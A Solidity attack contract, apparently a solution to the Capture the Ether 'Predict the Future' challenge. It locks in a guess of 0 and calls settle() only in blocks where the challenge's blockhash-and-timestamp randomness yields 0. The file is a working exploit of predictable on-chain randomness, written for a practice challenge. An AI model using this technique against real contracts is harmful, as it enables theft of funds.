// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);
    function settle() external;
    function lockInGuess(uint8 n) external payable;
}
contract PredictTheFutureAttack {
    IPredictTheFutureChallenge challenge;
    constructor(address _challenge) {
        challenge = IPredictTheFutureChallenge(_challenge);
    }
    function guess() external payable {
        require(msg.value >= 1 ether, "Not enough ether");
        challenge.lockInGuess{value: 1 ether}(0);
    } 
    function attack(uint settlementBlockNumber) external {
        if (block.number <= settlementBlockNumber) {
            return;
        }
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        if (answer != 0) {
            return;
        }
        challenge.settle();
        require(challenge.isComplete(), "Failed");
    }
    receive() external payable {}
}